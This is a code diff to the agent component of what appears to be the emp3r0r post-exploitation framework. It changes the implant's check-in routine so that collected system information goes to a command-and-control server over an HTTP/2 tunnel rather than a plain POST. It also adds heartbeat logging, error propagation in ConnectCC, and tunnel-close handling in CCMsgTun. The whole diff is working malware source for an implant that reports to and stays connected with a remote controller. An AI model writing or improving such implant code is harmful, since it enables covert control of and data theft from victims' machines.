@@ -1,7 +1,6 @@
 package agent
 
 import (
-	"bytes"
 	"context"
 	"encoding/json"
 	"fmt"
@@ -26,21 +25,25 @@ import (
 // CheckIn poll CC server and report its system info
 func CheckIn() error {
 	info := CollectSystemInfo()
-	log.Println("Collected system info")
+	checkin_URL := emp3r0r_data.CCAddress + tun.CheckInAPI + "/" + uuid.NewString()
+	log.Printf("Collected system info, now checking in (%s)", checkin_URL)
 
-	sysinfoJSON, err := json.Marshal(info)
+	conn, _, cancel, err := ConnectCC(checkin_URL)
+	defer func() {
+		if conn != nil {
+			conn.Close()
+			cancel()
+		}
+	}()
 	if err != nil {
 		return err
 	}
-	_, err = emp3r0r_data.HTTPClient.Post(
-		emp3r0r_data.CCAddress+tun.CheckInAPI+"/"+uuid.NewString(),
-		"application/json",
-		bytes.NewBuffer(sysinfoJSON))
-	if err != nil {
-		return err
+	out := json.NewEncoder(conn)
+	err = out.Encode(info)
+	if err == nil {
+		log.Println("Checked in")
 	}
-	log.Println("Checked in")
-	return nil
+	return err
 }
 
 // IsCCOnline check RuntimeConfig.CCIndicator
@@ -99,17 +102,16 @@ func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel conte
 	ctx, cancel = context.WithCancel(context.Background())
 
 	h2 := h2conn.Client{Client: emp3r0r_data.HTTPClient}
-
 	log.Printf("ConnectCC: connecting to %s", url)
 	conn, resp, err = h2.Connect(ctx, url)
 	if err != nil {
-		log.Printf("Initiate conn: %s", err)
+		err = fmt.Errorf("Initiate conn: %s", err)
 		return
 	}
 
 	// Check server status code
 	if resp.StatusCode != http.StatusOK {
-		log.Printf("Bad status code: %d", resp.StatusCode)
+		err = fmt.Errorf("Bad status code: %d", resp.StatusCode)
 		return
 	}
 
@@ -134,6 +136,7 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 		}
 
 		cancel()
+		emp3r0r_data.KCPKeep = false // tell KCPClient to close this conn so we won't stuck
 		log.Print("CCMsgTun closed")
 	}()
 
@@ -186,22 +189,23 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 	}
 
 	sendHello := func(cnt int) bool {
+		var hello_msg emp3r0r_data.MsgTunData
 		// try cnt times then exit
 		for cnt > 0 {
 			cnt-- // consume cnt
 
 			// send hello
-			msg.Payload = "hello" + util.RandStr(util.RandInt(1, 100))
-			msg.Tag = RuntimeConfig.AgentTag
-			err = out.Encode(msg)
+			hello_msg.Payload = "hello" + util.RandStr(util.RandInt(1, 100))
+			hello_msg.Tag = RuntimeConfig.AgentTag
+			err = out.Encode(hello_msg)
 			if err != nil {
 				log.Printf("agent cannot connect to cc: %v", err)
 				util.TakeABlink()
 				continue
 			}
-			HandShakes[msg.Payload] = false
-			log.Printf("Hello (%s) sent", msg.Payload)
-			if !wait_hello(msg.Payload) {
+			HandShakes[hello_msg.Payload] = false
+			log.Printf("Hello (%s) sent", hello_msg.Payload)
+			if !wait_hello(hello_msg.Payload) {
 				cancel()
 				break
 			}
@@ -212,6 +216,7 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 
 	// keep connected
 	for ctx.Err() == nil {
+		log.Println("Hearbeat begins")
 		if !sendHello(util.RandInt(1, 10)) {
 			log.Print("sendHello failed")
 			break
@@ -220,6 +225,7 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 		if err != nil {
 			log.Printf("Updating agent sysinfo: %v", err)
 		}
+		log.Println("Hearbeat ends")
 		util.TakeASnap()
 	}
 
